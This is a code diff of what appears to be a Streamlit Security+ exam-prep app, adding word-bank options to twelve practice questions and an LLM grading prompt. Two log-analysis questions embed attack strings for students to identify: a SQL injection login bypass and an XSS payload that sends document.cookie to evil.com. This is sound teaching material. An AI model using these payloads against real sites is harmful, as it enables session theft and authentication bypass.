@@ -79,35 +79,104 @@ def get_video_topic(llm, question):
 
 def grade_pbq(llm, pbq_title, pbq_scenario, user_answers):
     template = """
-    You are a CompTIA PBQ (Performance-Based Question) Grader.
+    You are a friendly, encouraging CompTIA PBQ Grader.
     PBQ Title: {title}
     Scenario: {scenario}
-    Student's Submitted Configuration/Answers: {answers}
+    Student's Submitted Answers: {answers}
     
     Task:
-    1. Determine if the student's configuration is entirely correct.
-    2. Explain exactly why each part is right or wrong.
-    3. Provide the definitive correct configuration.
-    Keep it structured, encouraging, and highly technical.
+    1. Tell the student if they got the configuration completely right, partially right, or wrong.
+    2. Go through their answers and explain the "Why" using simple terms.
+    3. Provide the definitive correct configuration at the end.
     """
     prompt = PromptTemplate.from_template(template)
     chain = prompt | llm | StrOutputParser()
     return chain.invoke({"title": pbq_title, "scenario": pbq_scenario, "answers": str(user_answers)})
 
-# 6. PBQ DATABASE (1 to 12, Hardest at the end)
+# 6. PBQ DATABASE (Guided with Word Banks)
 PBQ_DB = {
-    1: {"title": "Port Configuration", "desc": "Match the default port to the network service.", "type": "match", "keys": ["SSH", "HTTPS", "RDP", "DNS"]},
-    2: {"title": "Auth Factors", "desc": "Categorize the MFA factors (Know, Have, Are).", "type": "match", "keys": ["Password", "Smartcard", "Retina Scan", "PIN"]},
-    3: {"title": "Malware Identification", "desc": "Match the behavior to the malware type (Ransomware, Rootkit, Trojan, Worm).", "type": "match", "keys": ["Encrypts files for payment", "Hides in OS kernel", "Self-replicates across network", "Disguises as legitimate software"]},
-    4: {"title": "Incident Response Lifecycle", "desc": "Order the phases of Incident Response (1-4).", "type": "order", "keys": ["Preparation", "Identification", "Containment", "Eradication"]},
-    5: {"title": "Cryptography Types", "desc": "Classify as Symmetric or Asymmetric.", "type": "match", "keys": ["AES", "RSA", "DES", "ECC"]},
-    6: {"title": "Cloud Deployment Models", "desc": "Classify as IaaS, PaaS, or SaaS.", "type": "match", "keys": ["AWS EC2", "Salesforce", "Google App Engine", "Microsoft Azure VMs"]},
-    7: {"title": "Basic Firewall Rule", "desc": "Configure a rule to block HTTP traffic from 192.168.1.50 to the web server.", "type": "firewall"},
-    8: {"title": "RAID Configuration", "desc": "Select the best RAID for the given scenarios.", "type": "match", "keys": ["High Performance, No Fault Tolerance", "Mirroring", "Striping with Parity (Min 3 drives)"]},
-    9: {"title": "Log Analysis: SQL Injection", "desc": "Analyze the web log and identify the malicious payload parameter.", "type": "log", "log": '10.0.0.5 - - [10/Oct] "GET /login.php?user=admin\' OR \'1\'=\'1&pass=123 HTTP/1.1" 200 4321'},
-    10: {"title": "Log Analysis: XSS", "desc": "Analyze the log and identify the Cross-Site Scripting attack vector.", "type": "log", "log": '192.168.1.10 - - [12/Oct] "POST /comment.php?body=<script>fetch(\'http://evil.com/?cookie=\'+document.cookie)</script> HTTP/1.1" 200'},
-    11: {"title": "Digital Certificates", "desc": "Match the certificate component to its definition.", "type": "match", "keys": ["CSR", "CRL", "Public Key", "Private Key"]},
-    12: {"title": "Advanced ACL Troubleshooting", "desc": "Review the firewall rules. A user at 10.1.1.5 cannot reach the HTTPS web server at 10.2.2.10. Identify the misconfigured rule number.", "type": "log", "log": "Rule 1: DENY IP 10.1.1.0/24 to 10.2.2.0/24 PORT 80\nRule 2: DENY IP ANY to 10.2.2.10 PORT 443\nRule 3: ALLOW IP 10.1.1.0/24 to ANY PORT ANY\nRule 4: DENY ALL ALL"}
+    1: {
+        "title": "Port Configuration", 
+        "desc": "Match the correct default port number to the network service.", 
+        "type": "match", 
+        "keys": ["SSH", "HTTPS", "RDP", "DNS"],
+        "options": ["22", "23", "53", "80", "443", "3389"]
+    },
+    2: {
+        "title": "Authentication Factors", 
+        "desc": "Categorize the MFA security factors.", 
+        "type": "match", 
+        "keys": ["Password", "Smartcard", "Retina Scan", "PIN"],
+        "options": ["Something you know", "Something you have", "Something you are", "Somewhere you are"]
+    },
+    3: {
+        "title": "Malware Identification", 
+        "desc": "Match the malicious behavior to the correct malware type.", 
+        "type": "match", 
+        "keys": ["Encrypts files and demands payment", "Hides deep in the OS kernel", "Self-replicates across the network", "Disguises itself as legitimate software"],
+        "options": ["Ransomware", "Rootkit", "Worm", "Trojan", "Spyware"]
+    },
+    4: {
+        "title": "Incident Response Lifecycle", 
+        "desc": "Select the correct phase of Incident Response in order.", 
+        "type": "order", 
+        "keys": ["Step 1", "Step 2", "Step 3", "Step 4"],
+        "options": ["Preparation", "Identification", "Containment", "Eradication", "Recovery", "Lessons Learned"]
+    },
+    5: {
+        "title": "Cryptography Types", 
+        "desc": "Classify the encryption algorithm as Symmetric or Asymmetric.", 
+        "type": "match", 
+        "keys": ["AES", "RSA", "DES", "ECC"],
+        "options": ["Symmetric", "Asymmetric", "Hashing"]
+    },
+    6: {
+        "title": "Cloud Deployment Models", 
+        "desc": "Classify the service as IaaS, PaaS, or SaaS.", 
+        "type": "match", 
+        "keys": ["AWS EC2 (Virtual Servers)", "Salesforce (Web CRM)", "Google App Engine", "Microsoft Azure VMs"],
+        "options": ["Infrastructure as a Service (IaaS)", "Platform as a Service (PaaS)", "Software as a Service (SaaS)"]
+    },
+    7: {
+        "title": "Basic Firewall Rule", 
+        "desc": "Create a rule to strictly BLOCK web traffic (HTTP) coming from the IP 192.168.1.50.", 
+        "type": "firewall"
+    },
+    8: {
+        "title": "RAID Configuration", 
+        "desc": "Select the best RAID setup for the given business scenario.", 
+        "type": "match", 
+        "keys": ["High Performance, Zero Fault Tolerance", "Exact Mirroring (Redundancy)", "Striping with Parity (Min 3 drives)"],
+        "options": ["RAID 0", "RAID 1", "RAID 5", "RAID 10"]
+    },
+    9: {
+        "title": "Log Analysis: Database Attack", 
+        "desc": "Look at the web log and identify what type of attack is happening.", 
+        "type": "log", 
+        "log": '10.0.0.5 - - [10/Oct] "GET /login.php?user=admin\' OR \'1\'=\'1&pass=123 HTTP/1.1" 200 4321',
+        "options": ["SQL Injection", "Cross-Site Scripting (XSS)", "Buffer Overflow", "DDoS"]
+    },
+    10: {
+        "title": "Log Analysis: Malicious Script", 
+        "desc": "Analyze the log and identify the attack vector targeting user browsers.", 
+        "type": "log", 
+        "log": '192.168.1.10 - - [12/Oct] "POST /comment.php?body=<script>fetch(\'http://evil.com/?cookie=\'+document.cookie)</script> HTTP/1.1" 200',
+        "options": ["Cross-Site Scripting (XSS)", "SQL Injection", "Command Injection", "CSRF"]
+    },
+    11: {
+        "title": "Digital Certificates", 
+        "desc": "Match the PKI component to its definition.", 
+        "type": "match", 
+        "keys": ["Used to encrypt data sent to a server", "Kept secret by the server to decrypt data", "A list of revoked/bad certificates"],
+        "options": ["Public Key", "Private Key", "CRL (Certificate Revocation List)", "CSR"]
+    },
+    12: {
+        "title": "Advanced ACL Troubleshooting", 
+        "desc": "Review the firewall rules. A user at 10.1.1.5 cannot reach the secure website (HTTPS) at 10.2.2.10. Which rule number is causing the block?", 
+        "type": "log", 
+        "log": "Rule 1: DENY IP 10.1.1.0/24 to 10.2.2.0/24 PORT 80\nRule 2: DENY IP ANY to 10.2.2.10 PORT 443\nRule 3: ALLOW IP 10.1.1.0/24 to ANY PORT ANY\nRule 4: DENY ALL ALL",
+        "options": ["Rule 1", "Rule 2", "Rule 3", "Rule 4"]
+    }
 }
 
 # 7. MAIN APPLICATION
@@ -159,6 +228,7 @@ def main():
         
         st.markdown("---")
         st.header("📺 Quick Review Topics")
+        st.write("Watch Professor Messer lessons anytime:")
         topics = ["1.0 General Concepts", "2.0 Threats & Mitigations", "3.0 Architecture", "4.0 Security Operations", "5.0 Program Management"]
         for topic in topics:
             query = urllib.parse.quote(f"Professor Messer SY0-701 {topic}")
@@ -170,42 +240,62 @@ def main():
             st.rerun()
 
     # ==========================================
-    # MODE 1: PBQ PRACTICE LAB
+    # MODE 1: PBQ PRACTICE LAB (GUIDED)
     # ==========================================
     if st.session_state.app_mode == "PBQ Practice Lab":
         st.header("💻 Performance-Based Questions (PBQs)")
-        st.write("PBQs test your hands-on ability to solve problems. Select a scenario below. Difficulty increases from 1 to 12.")
+        st.write("PBQs test your hands-on ability. Select a scenario below. Difficulty increases from 1 to 12.")
         
         pbq_id = st.selectbox("Select PBQ Scenario:", list(PBQ_DB.keys()), format_func=lambda x: f"PBQ {x}: {PBQ_DB[x]['title']} (Level {x})")
-        
         pbq = PBQ_DB[pbq_id]
+        
         st.info(f"**Scenario:** {pbq['desc']}")
         
-        # Build Dynamic Form based on PBQ Type
         user_submission = {}
         with st.form(f"pbq_form_{pbq_id}"):
-            if pbq['type'] == "match" or pbq['type'] == "order":
-                for key in pbq['keys']:
-                    user_submission[key] = st.text_input(f"{key}:")
+            # For Match, Order, and Multiple Choice Log Analysis
+            if pbq['type'] in ["match", "order", "log"]:
+                
+                # Show the log block if it exists
+                if 'log' in pbq:
+                    st.code(pbq['log'], language='bash')
+
+                # Show Word Bank / Options
+                st.write("### 🗂️ Word Bank / Available Options")
+                st.info(" | ".join(pbq['options']))
+                st.write("---")
+
+                # If it has specific keys to match (like Ports)
+                if 'keys' in pbq:
+                    col1, col2 = st.columns(2)
+                    for i, key in enumerate(pbq['keys']):
+                        with (col1 if i % 2 == 0 else col2):
+                            user_submission[key] = st.selectbox(f"{key}:", ["-- Select --"] + pbq['options'])
+                # If it's just analyzing a log to find one answer
+                else:
+                    user_submission['Answer'] = st.selectbox("Select the correct finding:", ["-- Select --"] + pbq['options'])
+
+            # For Firewall rules
             elif pbq['type'] == "firewall":
                 col1, col2, col3, col4 = st.columns(4)
-                user_submission['Action'] = col1.selectbox("Action", ["ALLOW", "DENY"])
-                user_submission['Protocol'] = col2.selectbox("Protocol", ["TCP", "UDP", "ICMP", "ANY"])
-                user_submission['Source IP'] = col3.text_input("Source IP")
-                user_submission['Dest Port'] = col4.text_input("Dest Port")
-            elif pbq['type'] == "log":
-                st.code(pbq['log'], language='bash')
-                user_submission['Answer'] = st.text_input("Enter your finding/answer here:")
+                user_submission['Action'] = col1.selectbox("Action", ["-- Select --", "ALLOW", "DENY"])
+                user_submission['Protocol'] = col2.selectbox("Protocol", ["-- Select --", "TCP", "UDP", "HTTP", "ANY"])
+                user_submission['Source IP'] = col3.text_input("Source IP (e.g., 192.168.x.x)")
+                user_submission['Dest Port'] = col4.selectbox("Dest Port", ["-- Select --", "22", "53", "80", "443", "ANY"])
 
-            submit_pbq = st.form_submit_button("Submit Configuration")
+            submit_pbq = st.form_submit_button("Submit PBQ for Grading")
         
         if submit_pbq:
-            with st.spinner("AI Tutor is grading your PBQ..."):
-                st.session_state.pbq_feedback = grade_pbq(llm, pbq['title'], pbq['desc'], user_submission)
+            # Check if user left things blank
+            if any(val == "-- Select --" or val == "" for val in user_submission.values()):
+                st.error("⚠️ Please select an answer for all fields before submitting.")
+            else:
+                with st.spinner("AI Tutor is grading your PBQ..."):
+                    st.session_state.pbq_feedback = grade_pbq(llm, pbq['title'], pbq['desc'], user_submission)
         
         if st.session_state.pbq_feedback:
             st.markdown("---")
-            st.warning("🤖 **AI PBQ Evaluation:**")
+            st.warning("🤖 **AI PBQ Evaluation & Grade:**")
             st.write(st.session_state.pbq_feedback)
             if st.button("Clear Feedback"):
                 st.session_state.pbq_feedback = ""
@@ -215,7 +305,6 @@ def main():
     # MODE 2: ADAPTIVE SIMULATOR (ORIGINAL)
     # ==========================================
     elif st.session_state.app_mode == "Adaptive Simulator":
-        # Adaptive Logic
         if st.session_state.streak >= 3: st.session_state.difficulty = "HARD"
         elif st.session_state.streak <= -3: st.session_state.difficulty = "EASY"
         else: st.session_state.difficulty = "NORMAL"
@@ -225,7 +314,6 @@ def main():
             st.success(f"🎉 Exam Finished! Final Score: {st.session_state.correct_count} / 90")
             return
 
-        # Fetch Question
         if st.session_state.current_q is None:
             with st.spinner("AI Tutor is finding your next question..."):
                 while st.session_state.db_idx < len(st.session_state.all_docs):
